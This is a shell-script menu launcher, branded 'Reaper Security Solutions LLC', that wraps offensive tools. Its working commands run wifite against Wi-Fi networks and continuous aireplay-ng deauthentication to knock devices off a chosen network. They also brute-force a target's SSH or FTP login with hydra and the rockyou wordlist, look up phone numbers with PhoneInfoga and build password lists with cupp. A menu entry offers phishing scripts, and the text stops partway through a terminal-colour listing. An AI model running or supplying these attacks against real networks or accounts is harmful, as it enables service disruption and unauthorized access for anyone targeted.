#!/bin/sh

D=$( date '+%A %B %d, %Y' )
T=$( date '+%r ' )
R=$( tput setaf 1 )
G=$( tput setaf 2 )
Y=$( tput setaf 3 )
FOUND=`grep "eth0:\|wlan0" /proc/net/dev`
FOUNDD=`grep "eth0:\|ccmni0" /proc/net/dev`
FOUNDDD=`grep "eth0:\|ccmni1" /proc/net/dev`
IP=$( ip addr show dev wlan0 | sed -e's/^.*inet \([^ ]*\)\/.*$/\1/;t;d' )
IPP=$( ip addr show dev ccmni0 | sed -e's/^.*inet \([^ ]*\)\/.*$/\1/;t;d' )
IPPP=$( ip addr show dev ccmni1 | sed -e's/^.*inet \([^ ]*\)\/.*$/\1/;t;d' )

while true
do
  clear
  echo " "
  echo $R"Reaper Security Solutions LLC"
  echo ""
  echo $G"        ~Welcome~"
  echo "It's currently $T"
  echo "on $D"
  echo ""
  echo " "
  if  [ -n "$FOUND" ] ; then
  echo $Y"ip:    $IP"
  else
  echo $Y"ip:    $IPP"
  echo " "
  echo $G"connect to wifi for scan options"
  fi
  echo $G" "
  echo " "
  echo "        Main Menu"
  echo " "
  echo " "
  echo $R"1)$G notes and guides"
  echo $R"2)$G open wifi and connections menu"
  echo $R"3)$G ssh/scp/ftp connections"
  echo $R"4)$G enable/disable servers menu"
  echo $R"5)$G quick jump to common locations"
  echo $R"6)$G Phone number lookup system"
  echo $R"7)$G make/view wordlist & passwd lists"
  echo $R"8)$G helpful scripts collection menu"
  echo $R"9)$G enable full ssh with ngrok "
  echo $R"0)$G use phishing scripts and apps"
  echo " "
  echo $R"x)$Y exit"
  echo $G" "
  read -n 1 -p "option: $R" user_intent
  echo $G" "
  if [ $user_intent == x ]
  then
    clear
    exit
  fi
  if [ $user_intent == 1 ]
  then
    while true
    do
      clear
      echo $R"1)$G sdcards"
      echo $R"2)$G kali source.list"
      echo $R"3)$G notes directory"
      echo " "
      echo $R"x)$G exit"
      echo " "
      read -n 1 -p "open: $G" user_notes
      if [ $user_notes == 1 ]
      then
        cd $HOME/notes
        nano -c $HOME/notes/sdcards
        break
      fi
      if [ $user_notes == 2 ]
      then
        clear
        echo " "
        echo $Y"kali sources.list"
        echo " "
        echo $R"deb http://http.kali.org/kali kali-rolling main non-free contrib"
        sleep 6
      fi
      if [ $user_notes == 3 ]
      then
        cd $HOME/notes
        ls
        read -p "open file: $R" user_ff
        nano -c $user_ff
      fi
      if [ $user_notes == x ]
      then
        break
      fi
    done
  fi
  if [ $user_intent == 2 ]
  then
    while true
    do
      clear
      echo " "
      echo $R"Reaper Security Solutions LLC"
      echo " "
      echo " "
      echo $G"        ~Welcome~"
      echo "It's currently $T"
      echo "on $D"
      echo " "
      echo " "
      if  [ -n "$FOUND" ] ; then
      echo "    your current ip is:"
      echo " "
      echo $Y"       $IP"
      else
      echo "your current mobile ip is:"
      echo " "
      echo " "
      echo " "
      echo " "
      echo $Y"$IPP"
      echo " "
      echo $G"connect to wifi for scan options"
      fi
      echo $G""
      echo ""
      echo "        Main Menu"
      echo ""
      echo $R"1)$G run wifite against network"
      echo $R"2)$G block devices or networks"
      echo $R"3)$G scan local wifi networks"
      echo $R"4)$G fix wifi after mon mode"
      echo $R"5)$G crack ssh of ftp server"
      echo " "
      echo $R"x)$Y exit"
      echo " "
      read -n 1 -p "option: $R" user_op
      if [ $user_op == x ]
      then
        break
      fi
      if [ $user_op == 1 ]
      then
        echo $G" "
        sudo airmon-ng check kill
        sudo airmon-ng start wlan0
        sudo wifite
        echo " "
        echo "press$R y$G to repair wifi or$R n$G to exit"
        echo " "
        read -n 1 -p "repair: $R" user_r
        if [ $user_r == y ]
        then
          echo $G" "
          sudo airmon-ng stop wlan0mon
          sleep 2
          sudo ifconfig wlan0 up
          sleep 1
          sudo ifconfig
        fi
        if [ $user_r == n ]
        then
          break
        fi
      fi
      if [ $user_op == 2 ]
      then
        echo $G" "
        sudo airmon-ng check kill
        sudo airmon-ng start wlan0
        sudo airodump-ng wlan0mon
        echo "press$R a$G to block all devices"
        echo "press$R d$G to block one device"
        read -n 1 -p "block: $R" user_b
        if [ $user_b == a ]
        then
          echo $G"note the bssid of target wifi network"
          echo " "
          echo " "
          read -p "bssid: $R" $user_w
          sudo aireplay-ng -0 0 -a $user_w wlan0mon
        fi
        if [ $user_b == d ]
        then
          echo $G"note target wifi bssid and channel"
          read -p "bssid: $R" user_bss
          read -p $G"channel: $R" user_ch
          sudo airodump-ng -d $user_bss -c $user_ch wlan0mon
          echo $G"note device bssid to block"
          read -p "bssid: $R" user_target
          sudo aireplay-ng -0 0 -a $user_bss -c $user_target wlan0mon
        fi
        echo "press$R y$G to repair wifi or$R n$G to exit"
        echo " "
        read -n 1 -p "repair: $R" user_r
        if [ $user_r == y ]
        then
          echo $G" "
          sudo airmon-ng stop wlan0mon
          sleep 2
          sudo ifconfig wlan0 up
          sleep 1
          sudo ifconfig
        fi
        if [ $user_r == n ]
        then
          break
        fi
      fi
      if [ $user_op == 3 ]
      then
        clear
        echo " "
        echo $R"1)$G use nmap"
        echo $R"2)$G use aircrack-ng"
        echo " "
        echo $R"x)$G exit"
        echo " "
        read -n 1 -p "scan: $R" user_scan
        if [ $user_scan == 1 ]
        then
          while true
          do
            clear
            echo $G" "
            echo $G"select a nmap scan type:"
            echo " "
            echo " "
            echo $R"1)$G scan your device for open ports"
            echo $R"2)$G advanced scan of your device"
            echo $R"3)$G simple wifi scan for devices"
            echo $R"4)$G scan wifi for devices and ports"
            echo $R"5)$G advanced wifi scan, devices & ports"
            echo " "
            echo " "
            echo $R"v)$G view results file"
            echo $R"x)$Y exit"
            echo " "
            echo $R" "
            read -n 1 -p "scan:$G " user_s
            echo " "
            if [ $user_s == 1 ]
            then
              clear
              echo " "
              nmap $IP | tee -a scan-result.txt
              echo " "
              echo $R"results stored in scan-result.txt"
              sleep 5
              echo $G" "
            fi
            if [ $user_s == 2 ]
            then
              clear
              echo " "
              nmap -A $IP | tee -a scan-result.txt
              echo " "
              echo $R"results stored in scan-result.txt"
              sleep 6
              echo $G" "
            fi
            if [ $user_s == 3 ]
            then
              clear
              echo " "
              nmap -nP $IP/24 | tee -a scan-result.txt
              echo " "
              echo $R"results stored in scan-result.txt"
              sleep 6
              echo $G" "
            fi
            if [ $user_s == 4 ]
            then
              clear
              echo " "
              nmap $IP/24 | tee -a scan-result.txt
              echo " "
              echo $R"results stored in scan-result.txt"
              sleep 6
              echo $G" "
            fi
            if [ $user_s == 5 ]
            then
            clear
            echo " "
            nmap -A $IP/24 | tee -a scan-result.txt
            echo " "
            echo $R"results stored in scan-result.txt"
            sleep 6
            echo $G" "
            fi
            if [ $user_s == v ]
            then
              nano -c scan-result.txt
            fi
            if [ $user_s == x ]
            then
              clear
              break
            fi
          done
        fi
        if [ $user_scan == 2 ]
        then
          sudo airmon-ng check kill
          sudo airmon-ng start wlan0
          sudo airodump-ng wlan0mon
          echo $G" "
          echo "press$R y$G to repair wifi or$R n$G to exit"
          echo " "
          read -n 1 -p "repair: $R" user_r
          if [ $user_r == y ]
          then
            sudo airmon-ng stop wlan0mon
            sleep 2
            sudo ifconfig wlan0 up
            sleep 1
            sudo ifconfig
          fi
          if [ $user_r == n ]
          then
            break
          fi
        fi
      fi
      if [ $user_op == 4 ]
      then
        echo $G" "
        echo "press$R y$G to repair wifi or$R n$G to exit"
        echo " "
        read -n 1 -p "repair: $R" user_r
        if [ $user_r == y ]
        then
          sudo airmon-ng stop wlan0mon
          sleep 2
          sudo ifconfig wlan0 up
          sleep 1
          sudo ifconfig
        fi
        if [ $user_r == n ]
        then
          break
        fi
      fi
      if [ $user_op == x ]
      then
        break
      fi
      if [ $user_op == 5 ]
      then
        clear
        sleep 1
        echo " "
        echo "$Rwarning $Gthis script assumes rockyou.txt is located in the"
        echo "home directory, if not then use the custom wordlist option"
        echo " "
        echo "Select an option to continue"
        echo " "
        echo $R"1)$G enter known target ip address"
        echo $R"2)$G scan for connected devices"
        echo " "
        read -n 1 -p "option: $R" user_intent
        echo " "
        if [ $user_intent == 1 ]
        then
          sleep 1
          echo " "
          echo $G"enter the$R target's$G ip address below"
          echo " "
          read -p "target ip: $R" user_target
          echo " "
          echo " "
          echo "$user_target $Gentered as target ip"
          echo " "
          echo "is this correct? enter$R y$G/$R n$G to proceed"
          echo " "
          read -n 1 -p ": $R" user_con
          if [ $user_con == y ]
          then
            sleep 1
            echo " "
            echo "$User_con$G selected as target ip"
            echo " "
            sleep 3
          fi
          if [ $user_con == n ]
          then
            echo " $(tput reset)"
            break
          fi
        fi
        if [ $user_intent == 2 ]
        then
          clear
          sleep 1
          echo $G" "
          ifconfig
          echo " "
          echo $(tput setaf 4)"======================================================="
          echo $G" "
          echo "please locate your$R inet ip$G address from above"
          echo " "
          echo "$Rreplace$G the $Rlast set$G of numbers with$R 00"
          echo "$Gand then enter it below in this format."
          echo " "
          echo "example, if ip is $(tput setaf 3)192.168.43.243$(tput setaf 2) then enter..."
          echo " $(tput setaf 3)"
          echo "192.168.43.00"
          echo " $(tput setaf 2)"
          read -p "ip: $(tput setaf 1)" user_ip
          echo " "
          echo "$user_ip $(tput setaf 2)selected, scan wifi for target devices?"
          echo " "
          read -n 1 -p "scan? $(tput setaf 1)y$(tput setaf 2)/$(tput setaf 1)n$(tput setaf 2): $(tput setaf 1)" user_scan
          if [ $user_scan == y ]
          then
            sleep 1
            echo " $(tput setaf 2)"
            nmap -sP $user_ip/24
            echo " "
            echo "connected devices show up as the following..."
            echo " "
            echo "Nmap scan report for 192.168.43.130"
            echo " "
            echo " "
            echo "select target device and enter its address below"
            echo " "
            read -p "target's ip: $(tput setaf 1)" user_target
            echo " "
            echo "$user_target $(tput setaf 2)entered as target ip"
            echo " "
            echo "is this correct? enter $(tput setaf 1)y$(tput setaf 2)/$(tput setaf 1)n$(tput setaf 2) to proceed"
            echo " "
            read -n 1 -p ": $(tput setaf 1)" user_con
            if [ $user_con == y ]
            then
              sleep 1
              echo " "
              echo "$user_target $(tput setaf 2)selected as target ip"
              echo " "
              sleep 3
            fi
            if [ $user_con == n ]
            then
              echo "$(tput reset) "
              break
            fi
          fi
          if [ $user_scan == n ]
          then
            sleep 1
          fi
        fi
        sleep 1
        echo " $(tput setaf 2)"
        echo "do you want to scan target for connections or ports?"
        echo " "
        read -n 1 -p "scan $(tput setaf 1)y$(tput setaf 2)/$(tput setaf 1)n$(tput setaf 2): $(tput setaf 1)" user_ps
        if [ $user_ps == y ]
        then
          sleep 1
          echo " $(tput setaf 2)"
          nmap -A -p 1-22 $user_target
          echo " "
          echo "look for the following:"
          echo " "
          echo "21/tcp open ftp"
          echo " "
          echo "and/or"
          echo " "
          echo "22/tcp open ssh"
          echo " "
          echo "open indicates the service is active and crackable"
          echo "closed indicates that the service is unavailable"
          echo " "
          echo "enter $(tput setaf 1)y$(tput setaf 2) to crack a connection or $(tput setaf 1)x$(tput setaf 2) to exit"
          echo " "
          read -n 1 -p "continue?: $(tput setaf 1)" user_crk
          if [ $user_crk == y ]
          then
            sleep 1
          fi
          if [ $user_crk == x ]
          then
            echo "$(tput reset) "
            break
          fi
        fi
        if [ $user_ps == n ]
        then
          sleep 1
        fi
        sleep 1
        echo " $(tput setaf 2)"
        echo "select from the following options"
        echo " "
        echo $(tput setaf 1)"1)$(tput setaf 2) establish a ssh connection with target"
        echo $(tput setaf 1)"2)$(tput setaf 2) establish a ftp connection with target"
        echo $(tput setaf 1)"3)$(tput setaf 2) crack target device's ssh connection"
        echo $(tput setaf 1)"4)$(tput setaf 2) crack target device's ftp connection"
        echo " "
        read -n 1 -p "option: $(tput setaf 1)" user_do
        if [ $user_do == 1 ]
        then
          sleep 1
          echo $(tput setaf 2)"starting ssh connection..."
          echo " "
          echo "enter the login credentials below"
          echo " "
          read -p "username: $(tput setaf 1)" user_name
          echo " "
          echo "$user_name $(tput setaf 2)selected"
          echo " "
          echo "attempting to establish connection..."
          ssh $user_name@$user_target
        fi
        if [ $user_do == 2 ]
        then
          sleep 1
          echo $(tput setaf 2)"starting ftp connection..."
          echo " "
          echo "enter the login credentials below"
          echo " "
          read -p "username: $(tput setaf 1)" user_name
          echo " "
          echo "$user_name $(tput setaf 2)selected"
          echo " "
          echo "attempting to establish connection..."
          ftp $user_name@$user_target
        fi
        if [ $user_do == 3 ]
        then
          echo " $(tput setaf 2)"
          echo "enter the ssh username you want to crack"
          echo " "
          read -p "username: $(tput setaf 1)" user_id
          echo " $(tput setaf 2)"
          echo "press $(tput setaf 1)c$(tput setaf 2) to use a custom wordlist or $(tput setaf 1)n$(tput setaf 2) to continue"
          echo " "
          read -n 1 -p "custom wordlist? $(tput setaf 1)" user_cus
          if [ $user_cus == c ]
          then
            sleep 1
            echo " $(tput setaf 2)"
            echo "enter path to the wordlist you wish to use"
            echo " "
            echo "example, $HOME/rockyou.txt"
            echo " "
            read -p "path: $(tput setaf 1)" user_path
            echo " "
            sleep 1
            echo " $(tput setaf 2)"
            hydra -l $user_id -P $user_path $user_target ssh
            echo " "
          fi
          if [ $user_cus == n ]
          then
            sleep 1
            echo " $(tput setaf 2)"
            hydra -l $user_id -P $HOME/rockyou.txt $user_target ssh
            echo " "
          fi
        fi
        if [ $user_do == 4 ]
        then
          echo " $(tput setaf 2)"
          echo "enter the ftp username you want to crack"
          echo " "
          read -p "username: $(tput setaf 1)" user_id
          echo " $(tput setaf 2)"
          echo "press $(tput setaf 1)c$(tput setaf 2) to use a custom wordlist or $(tput setaf 1)n$(tput setaf 2) to continue"
          echo " "
          read -n 1 -p "custom wordlist? $(tput setaf 1)" user_cus
          if [ $user_cus == c ]
          then
            sleep 1
            echo " $(tput setaf 2)"
            echo "enter path to custom wordlist"
            echo " "
            echo "example, $HOME/rockyou.txt"
            echo " "
            read -p "path: $(tput setaf 1)" user_path
            echo " $(tput setaf 2)"
            sleep 1
            echo " "
            hydra -l $user_id -P $user_path $user_target ftp
            echo " "
          fi
          if [ $user_cus == n ]
          then
            sleep 1
            echo " $(tput setaf 2)"
            hydra -l $user_id -P $HOME/rockyou.txt $user_target ftp
            echo " "
          fi
        fi
      fi
    done
  fi
  if [ $user_intent == 3 ]
  then
    while true
    do
      clear
      echo $G"select connection type"
      echo " "
      echo $R"1)$G ssh"
      echo $R"2)$G scp"
      echo $R"3)$G ftp"
      echo " "
      echo $R"x)$G exit"
      echo " "
      read -n 1 -p "connection: $R" user_c
      if [ $user_c == 1 ]
      then
        while true
        do
          clear
          echo " "
          echo $R"SSH Device Directory Menu"
          echo " "
          echo $R"01)$Y Raspbian Desktop"
          echo $R"02)$Y Kali Linux Desktop"
          echo $R"03)$Y P4wnP1 Win Lockpick"
          echo $R"04)$Y P4wnP1 HID Backdoor"
          echo $R"05)$Y Kali Linux Pi-Tail"
          echo $R"06)$Y Rasp Wifi Repeater"
          echo $R"07)$Y Piratebox Data Server"
          echo $R"08)$Y Research and Development"
          echo $R"09)$Y P4wnP1 A.L.O.A. First Wave"
          echo $R"10)$Y P4wnP1 A.L.O.A. Second Wave"
          echo " "
          echo $R"cc)$G custom"
          echo " "
          echo $R"xx)$Y exit$G"
          echo " "
          echo " "
          read -n 2 -p "Connect To: $R" user_dev
          case $user_dev in
            01)  echo " ";
                 echo "Connecting...";
                 ssh pi@192.168.43.254;;
            02)  echo " ";
                 echo "Connecting...";
                 ssh root@192.168.43.243;;
            03)  echo " ";
                 echo "Connecting...";
                 ssh pi@172.24.0.1;;
            04)  echo " ";
                 echo "Connecting...";
                 ssh pi@172.24.0.1;;
            05)  echo " ";
                 echo "Connecting...";
                 ssh root@192.168.43.243;;
            06)  echo " ";
                 echo "Connecting...";
                 ssh pi@192.168.43.243;;
            07)  echo " ";
                 echo "Connecting...";
                 ssh pi@192.168.43.254;;
            08)  echo " ";
                 echo "Connecting...";
                 ssh root@192.168.43.243;;
            09)  echo " ";
                 echo "Connecting...";
                 ssh pi@172.24.0.1;;
            10)  echo " ";
                 echo "Connecting...";
                 ssh root@172.24.0.1;;
            cc)  echo " ";
                 read -p "user: " USR;
                 read -p "IP: " IPD;
                 echo "Connecting...";
                 ssh $USR@$IPD;;
            xx)  echo " ";
                 break;;
          esac
          echo $G"Connection Terminated"
          sleep 3
        done
      fi
      if [ $user_c == 2 ]
      then
        while true
        do
          clear
          echo " "
          echo $R"SCP Device Directory Menu"
          echo " "
          echo $R"01)$Y Raspbian Desktop"
          echo $R"02)$Y Kali Linux Desktop"
          echo $R"03)$Y P4wnP1 Win Lockpick"
          echo $R"04)$Y P4wnP1 HID Backdoor"
          echo $R"05)$Y Kali Linux Pi-Tail"
          echo $R"06)$Y Rasp Wifi Repeater"
          echo $R"07)$Y Piratebox Data Server"
          echo $R"08)$Y Research and Development"
          echo $R"09)$Y P4wnP1 A.L.O.A. First Wave"
          echo $R"10)$Y P4wnP1 A.L.O.A. Second Wave"
          echo " "
          echo $R"cc)$G custom"
          echo " "
          echo $R"xx)$Y exit$G"
          echo " "
          echo " "
          read -n 2 -p "Connect To: $R" user_dev
          case $user_dev in
            01)  echo " ";
                 read -p "file: " FILE;
                 echo "Connecting...";
                 scp $FILE pi@192.168.43.254;;
            02)  echo " ";
                 read -p "file: " FILE;
                 echo "Connecting...";
                 scp $FILE root@192.168.43.243;;
            03)  echo " ";
                 read -p "file: " FILE;
                 echo "Connecting...";
                 scp $FILE pi@172.24.0.1;;
            04)  echo " ";
                 read -p "file: " FILE;
                 echo "Connecting...";
                 scp $FILE pi@172.24.0.1;;
            05)  echo " ";
                 read -p "file: " FILE;
                 echo "Connecting...";
                 scp $FILE root@192.168.43.243;;
            06)  echo " ";
                 read -p "file: " FILE;
                 echo "Connecting...";
                 scp $FILE pi@192.168.43.243;;
            07)  echo " ";
                 read -p "file: " FILE;
                 echo "Connecting...";
                 scp $FILE pi@192.168.43.254;;
            08)  echo " ";
                 read -p "file: " FILE;
                 echo "Connecting...";
                 scp $FILE root@192.168.43.243;;
            09)  echo " "
                 read -p "file: " FILE;
                 echo "Connecting...";
                 scp $FILE pi@172.24.0.1;;
            10)  echo " ";
                 read -p "file: " FILE;
                 echo "Connecting...";
                 scp $FILE root@172.24.0.1;;
            cc)  echo " ";
                 read -p "file: " FILE;
                 echo " "
                 read -p "user: " USR;
                 read -p "IP: " IPD;
                 echo "Connecting...";
                 scp $FILE $USR@$IPD;;
            xx)  echo " ";
                 break;;
          esac
          echo $G"Connection Terminated"
          sleep 3
        done
      fi
      if [ $user_c == 3 ]
      then
        clear
        echo " "
        read -p $G"target ip: $R" user_ftp
        ftp $user_ftp
      fi
      if [ $user_c == x ]
      then
        break
      fi
    done
  fi
  if [ $user_intent == 4 ]
  then
    while true
    do
      clear
      echo " "
      echo $R"1)$G enable ftp"
      echo $R"2)$G disable ftp"
      echo $R"3)$G enable ssh server"
      echo $R"4)$G disable ssh server"
      echo $R"5)$G enable full ssh access"
      echo $R"6)$G enable vnc server (desktop)"
      echo $R"7)$G disable vnc server (desktop)"
      echo " "
      echo $R"x)$G exit"
      echo " "
      read -n 1 -p "enable: $R" user_en
      if [ $user_en == 1 ]
      then
        sv-enable ftpd
        sv up ftpd
        echo "port 8021"
      fi
      if [ $user_en == 2 ]
      then
        sv down ftpd
      fi
      if [ $user_en == 3 ]
      then
        sshd
      fi
      if [ $user_en == 4 ]
      then
        pkill sshd
      fi
      if [ $user_en == 5 ]
      then
        ./ngrok tcp 22
      fi
      if [ $user_en == 6 ]
      then
        vncserver
      fi
      if [ $user_en == 7 ]
      then
        vncserver --kill :1
      fi
      if [ $user_en == x ]
      then
        break
      fi
    done
  fi
  if [ $user_intent == 5 ]
  then
    clear
    echo " "
    echo $R"1)$G downloads"
    echo $R"2)$G scripts"
    echo $R"3)$G projects"
    echo $R"4)$G scriptlets"
    echo $R"5)$G notes"
    echo $R"6)$G payloads"
    echo " "
    read -n 1 -p "destination: $R" user_dest
    if [ $user_dest == 1 ]
    then
      cd $HOME/storage/shared/downloads
      break
    fi
    if [ $user_dest == 2 ]
    then
      cd $HOME/scripts
      break
    fi
    if [ $user_dest == 3 ]
    then
      cd $HOME/projects
      break
    fi
    if [ $user_dest == 4 ]
    then
      cd $HOME/scriptlets-codes
      break
    fi
    if [ $user_dest == 5 ]
    then
      cd $HOME/notes
      break
    fi
    if [ $user_dest == 6 ]
    then
      cd $HOME/payloads
      break
    fi
  fi
  if [ $user_intent == 6 ]
  then
    clear
    echo $G"enter the number in the following format"
    echo "1-603-xxx-xxxx"
    echo " "
    read -p "number: $R" user_number
    cd $HOME/PhoneInfoga
    python phoneinfoga.py -n $user_number
  fi
  if [ $user_intent == 7 ]
  then
    echo $R"1)$G cupp"
    echo $R"2)$G lazybee"
    echo $R"3)$G view finished pwd lst"
    read -n 1 -p "opt: $R" user_pwdlst
    if [ $user_pwdlst == 1 ]
    then
      cd $HOME/cupp
      python cupp.py -i
    fi
    if [ $user_pwdlst == 2 ]
    then
      cd $HOME/lazybee
      python2 lazybee.py
    fi
    if [ $user_pwdlst == 3 ]
    then
      cd $HOME/passwdlist
      break
    fi
  fi
  if [ $user_intent == 8 ]
  then
    while true
    do
      clear
      echo " "
      echo $R"Reaper Security Solutions LLC"
      echo " "
      echo $G"        ~Welcome~"
      echo "It's currently $T"
      echo "on $D"
      echo " "
      echo " "
      echo "select an option to continue"
      echo " "
      echo " "
      echo $R "1)$G convert text file to image"
      echo $R "2)$G replace word/s in a file"
      echo $R "3)$G remove .part to fix downloads"
      echo $R "4)$G convert dir to watch files"
      echo $R "5)$G send files via ssh to device"
      echo $R "6)$G add shebang to existing file"
      echo $R "7)$G unhide all files in a dir"
      echo $R "8)$G zip or unzip files or dir"
      echo $R "9)$G add one file to end of another"
      echo $R "10)$G add text to the end of a file"
      echo $R "11)$G load nmap wifi scanning menu"
      echo $R "12)$G load terminal colors guide"
      echo $R "13)$G move or copy files by type"
      echo $R "14)$G crack windows password hash"
      echo $R "15)$G time/date control set"

      echo " "
      echo $R "xx) exit"
      echo $R" "
      read -n 2 -p "option:$G " user_opt
      echo " "
      if [ $user_opt == xx ]
      then
        break
      fi
      if [ $user_opt == 1 ]
      then
        clear
        echo $G" "
        echo "this script will convert text file img" 
        echo " "
        echo "enter file name or path"
        echo " "
        read -p "file: $R" user_file
        sed -i -e 's/^/echo -e $(tput setaf 2)"/; s/$/"/' $user_file
        sed -i -e '1i#!/bin/sh\' $user_file
        echo $G" "
        echo "done"
        sleep 3
      fi
      if [ $user_opt == 2 ]
      then
        clear
        echo $G" "
        echo "this script will replace words in a file"
        echo " "
        read -p "file to edit: $R" user_edit
        echo " "
        read -p $G"find and replace: $R" search
        echo " "
        read -p $G"replace with: $R" replace
        echo $G" "
        if [[ $search != "" && $replace != "" ]]; then
          sed -i "s/$search/$replace/" $user_edit
          echo " "
          echo "done"
          sleep 3
        fi
      fi
      if [ $user_opt == 3 ]
      then
        clear
        echo $G" "
        echo "enter the target file's extention before the .part"
        echo " "
        echo "example; .mp4 .mp3 .mpeg .avi"
        echo " "
        read -p "target file ext: $(tput setaf 1)." user_ext
        for f in *.part; do
          mv -- "$f" "${f%.$user_ext.part}.$user_ext"
        done
        echo " "
        echo "done"
        sleep 3
      fi
      if [ $user_opt == 4 ]
      then
        clear
        echo " "
        echo $R"warning"
        echo " "
        echo $G"this will convert all dir from current"
        echo " "
        echo "contine?$R y$G/$Rn "
        echo $G" "
        read -n 1 -p "proceed: $R" user_go
        if [ $user_go == y ]
        then
          for i in */; do zip -r "${i%/}.zip" "$i"; done
          for f in *.zip; do
              mv -- "$f" "${f%.zip}.watch"
        done
        echo " "
        echo $G"done"
        sleep 3
        fi
        if [ $user_go == n ]
        then
          break
        fi
      fi
      if [ $user_opt == 5 ]
      then
        clear
        echo $G" "
        echo "to send a file over ssh you must know the following"
        echo "ip address, username, password of the device to send to"
        echo "as well as the paths to the file and its destination"
        echo " "
        read -n 1 -p "continue?: $R" user_ready
        if [ $user_ready == y ]
        then
          clear
          echo " "
          echo $G"enter the ip address of target"
          echo " "
          read -p "ip: $R" user_ip
          clear
          echo " "
          echo $G"enter the username of target device"
          echo " "
          read -p "username: $R" user_name
          clear
          echo " "
          echo $G"enter the path of the file to send"
          echo " "
          read -p "path: $R" user_file
          clear
          echo " "
          echo $G"enter destination path from HOME"
          echo " "
          read -p "destination: $R" user_dest
          clear
          scp $user_file $user_name@$user_ip:$user_dest
          echo " "
          echo $G"done"
          sleep 3
        fi
        if [ $user_ready == n ]
        then
          break
        fi
      fi
      if [ $user_opt == 6 ]
      then
        clear
        echo " "
        echo $G"add shebang to what file?"
        echo ' '
        read -p "file: $R" F
        sed -i -e '1i#!/bin/sh\' $F
        echo " "
        echo $G"done"
        sleep 3
      fi
      if [ $user_opt == 7 ]
      then
        clear
        echo " "
        echo $G"this will unhide all files in dir"
        echo " "
        read -n 1 -p "proceed? y/n $R" user_pro
        if [ $user_pro == y ]
        then
          for file in .*; do mv "$file" "${file#.}";done;
          clear
          echo " "
          echo $G"done"
          sleep 3
        fi
        if [ $user_pro == n ]
        then
          break
        fi
      fi
      if [ $user_opt == 8 ]
      then
        clear
        echo ''
        echo -e $R "press 1$G to zip a file or directory"
        echo " "
        echo -e $R "press 2$G to unzip a zip file"
        echo " "
        echo -e $R " "
        read -n 1 -p "zip/unzip: $G" user_what
        echo " "
        case $user_what in
          1)  clear;
              echo " ";
              echo -e "enter the name or path you want to zip";
              echo -e $R " ";
              read -p "zip: $G" user_zip;
              echo " ";
              echo "what do you want the zip file's name to be?";
              echo " ";
              echo "include .zip when naming";
              echo -e $R " ";
              read -p "name: $G" user_name;
              echo " ";
              echo "is this a directory?";
              echo -e $R " "
              read -n 1 -p "y/n $G" user_d;
              if [ $user_d == y ]
              then
                zip -r $user_name $user_zip
              else
                zip $user_name $user_zip
              fi
              echo " ";;
          2)  echo " ";
              echo " ";
              echo "enter the zip file's name or path to unzip";
              echo -e $R" ";
              read -p "unzip: $G" user_unzip;
              echo " ";
              unzip $user_unzip;;
          *)  echo "error...";
              break;;
        esac
        echo " "
        echo "done"
        sleep 3
      fi
      if [ $user_opt == 9 ]
      then
        clear
        echo " "
        echo $G"add this file to the end of another"
        echo " "
        read -p "file: $R" file1
        echo " "
        echo $G"add to this file"
        echo " "
        read -p "file: $R" file2
        cat $file1 >> $file2
        echo " "
        echo $G"done"
        sleep 3
      fi
      if [ $user_opt == 10 ]
      then
        clear
        echo " "
        echo "add this text"
        echo " "
        read -p "insert: $R" text
        echo " "
        echo $G"to this file"
        echo " "
        read -p "file: $R" filez
        echo " "
        sed '$ a\ > $text' $filez
        echo " "
        echo $G"done"
        sleep 3
      fi
      if [ $user_opt == 11 ]
      then
        clear
        echo " "
        echo " "
        if  [ -n "$FOUND" ] ; then
        echo " "
        else
        echo " "
        echo $R"critical error - you are not connected to wifi"
        sleep 4
        exit
        fi
        clear
        echo " "
        echo " "
        echo $G"current ip:$R $IP"
        echo " "
        echo " "
        echo " "
        echo $G"select a nmap scan type:"
        echo " "
        echo " "
        echo $R"1)$G scan your device for open ports"
        echo $R"2)$G advanced scan of your device"
        echo $R"3)$G simple wifi scan for devices"
        echo $R"4)$G scan wifi for devices and ports"
        echo $R"5)$G advanced wifi scan, devices & ports"
        echo " "
        echo " "
        echo $R"v)$G view results file"
        echo $R"x)$Y exit"
        echo " "
        echo $R" "
        read -n 1 -p "scan:$G " user_scan
        echo " "
        if [ $user_scan == 1 ]
        then
          clear
          echo " "
          nmap $IP | tee -a scan-result.txt
          echo " "
          echo $R"results stored in scan-result.txt"
          sleep 5
          echo $G" "
        fi
        if [ $user_scan == 2 ]
        then
          clear
          echo " "
          nmap -A $IP | tee -a scan-result.txt
          echo " "
          echo $R"results stored in scan-result.txt"
          sleep 6
          echo $G" "
        fi
        if [ $user_scan == 3 ]
        then
          clear
          echo " "
          nmap -nP $IP/24 | tee -a scan-result.txt
          echo " "
          echo $R"results stored in scan-result.txt"
          sleep 6
          echo $G" "
        fi
        if [ $user_scan == 4 ]
        then
          clear
          echo " "
          nmap $IP/24 | tee -a scan-result.txt
          echo " "
          echo $R"results stored in scan-result.txt"
          sleep 6
          echo $G" "
        fi
        if [ $user_scan == 5 ]
        then
          clear
          echo " "
          nmap -A $IP/24 | tee -a scan-result.txt
          echo " "
          echo $R"results stored in scan-result.txt"
          sleep 6
          echo $G" "
        fi
        if [ $user_scan == v ]
        then
          nano -c scan-result.txt
        fi
        if [ $user_scan == x ]
        then
          clear
          break
        fi
      fi
      if [ $user_opt == 12 ]
      then
        tput setaf 1; echo "1colors"
        tput setaf 2; echo "2colors"
        tput setaf 3; echo "3colors"
        tput setaf 4; echo "4colors"
        tput setaf 5; echo "5colors"
        tput setaf 6; echo "6colors"
        tput setaf 7; echo "7colors"
        tput setaf 8; echo "8colors"
        tput setaf 9; echo "9colors"
        tput setaf 10; echo "10colors"
        echo "10"
        echo ""
        tput setaf 11; echo "11colors"
        tput setaf 12; echo "12colors"
        tput setaf 13; echo "13colors"
        tput setaf 14; echo "14colors"
        tput setaf 15; echo "15colors"
        tput setaf 16; echo "16colors"
        tput setaf 17; echo "17colors"
        tput setaf 18; echo "18colors"
        tput setaf 19; echo "19colors"
        tput setaf 20; echo "20colors"
        echo "20"
        echo ""
        tput setaf 21; echo "21colors"
        tput setaf 22; echo "22colors"
        tput setaf 23; echo "23colors"
        tput setaf 24; echo "24colors"
        tput setaf 25; echo "25colors"
        tput setaf 26; echo "26colors"
        tput setaf 27; echo "27colors"
        tput setaf 28; echo "28colors"
        tput setaf 29; echo "29colors"
        tput setaf 30; echo "30colors"
        echo "30"
        echo ""
        tput setaf 31; echo "31colors"
        tput setaf 32; echo "32colors"
        tput setaf 33; echo "33colors"
        tput setaf 34; echo "34colors"
        tput setaf 35; echo "35colors"
        tput setaf 36; echo "36colors"
        tput setaf 37; echo "37colors"
